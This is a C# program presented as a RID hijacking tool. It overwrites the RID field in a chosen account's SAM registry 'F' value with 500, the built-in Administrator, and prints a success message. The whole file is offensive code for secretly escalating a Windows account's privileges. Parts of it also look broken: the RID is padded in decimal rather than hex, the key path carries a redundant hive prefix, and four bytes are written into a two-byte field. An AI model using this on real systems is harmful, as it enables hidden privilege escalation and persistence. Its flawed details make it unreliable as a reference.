using System;
using Microsoft.Win32;

class Program
{
    static void Main(string[] args)
    {
        Console.Write("Enter the 3-digit RID: ");
        string userInput = Console.ReadLine();

        if (userInput.Length == 3 && int.TryParse(userInput, out int rid))
        {
            string targetRID = rid.ToString("D8"); // Pads the number to the left with 5 zeros
            string registryPath = @"SAM\SAM\Domains\Account\Users";
            string valueName = "F";
            int position = 0x30;
            string newValueHex = "01F4";

            ModifyRegistryValue(registryPath, targetRID, valueName, position, newValueHex);
        }
        else
        {
            Console.WriteLine("Invalid input. Please enter a 3-digit RID.");
        }
    }

    static void ModifyRegistryValue(string path, string rid, string valueName, int position, string newValueHex)
    {
        string keyPath = $@"HKEY_LOCAL_MACHINE\{path}\{rid}";

        using (RegistryKey key = Registry.LocalMachine.OpenSubKey(keyPath, true))
        {
            if (key != null)
            {
                byte[] value = (byte[])key.GetValue(valueName);
                if (value != null)
                {
                    uint newValue = Convert.ToUInt32(newValueHex, 16);
                    byte[] newValueBytes = BitConverter.GetBytes(newValue);

                    Array.Copy(newValueBytes, 0, value, position, newValueBytes.Length);
                    key.SetValue(valueName, value, RegistryValueKind.Binary);

                    string hexPosition = position.ToString("X");
                    Console.WriteLine($"[+] RID Hijack Success! Modified the '{valueName}' value at position 0x{hexPosition} in key {keyPath}");
                }
                else
                {
                    Console.WriteLine($"[-] Value {valueName} not found in key {keyPath}");
                }
            }
            else
            {
                Console.WriteLine($"[-] Key {keyPath} not found");
            }
        }
    }
}
